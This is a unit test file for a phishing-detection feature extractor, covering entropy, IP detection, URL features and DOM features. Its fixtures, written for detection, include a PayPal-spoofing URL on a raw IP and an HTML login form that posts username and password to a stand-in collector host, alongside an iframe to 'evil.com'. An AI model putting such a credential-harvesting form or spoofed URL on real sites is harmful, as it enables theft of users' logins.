"""Unit tests for feature extraction."""
import pytest
from ml_pipeline.features import extract_url_features, extract_dom_features, calculate_entropy, is_ip_address


def test_calculate_entropy():
    # Constant string has 0 entropy
    assert calculate_entropy("aaaaaa") == 0.0
    # Randomized string has high entropy
    assert calculate_entropy("a84b39zc!x98@12") > 3.0


def test_is_ip_address():
    assert is_ip_address("192.168.1.1") == 1
    assert is_ip_address("104.244.42.1:8080") == 1
    assert is_ip_address("google.com") == 0
    assert is_ip_address("paypal.com.verify.xyz") == 0


def test_extract_url_features_phishing():
    url = "http://192.168.1.100:8080/paypal.com/login-verify-account.php?id=9928"
    feats = extract_url_features(url)
    
    assert feats["has_ip"] == 1
    assert feats["has_port"] == 1
    assert feats["is_https"] == 0
    assert feats["has_brand_spoofing"] == 1
    assert feats["keyword_count"] >= 2


def test_extract_url_features_legitimate():
    url = "https://www.google.com/search?q=machine+learning"
    feats = extract_url_features(url)
    
    assert feats["has_ip"] == 0
    assert feats["is_https"] == 1
    assert feats["is_suspicious_tld"] == 0
    assert feats["has_brand_spoofing"] == 0


def test_dom_features():
    html_sample = """
    <html>
        <body>
            <form action="http://insecure-collector.xyz/post" method="POST">
                <input type="text" name="username" />
                <input type="password" name="pwd" />
                <input type="hidden" name="csrf" value="123" />
            </form>
            <iframe src="http://evil.com"></iframe>
        </body>
    </html>
    """
    dom = extract_dom_features(html_sample, current_domain="myportal.com")
    assert dom["num_forms"] == 1
    assert dom["has_password_field"] == 1
    assert dom["insecure_form_action"] == 1
    assert dom["num_iframes"] == 1
    assert dom["has_hidden_inputs"] == 1
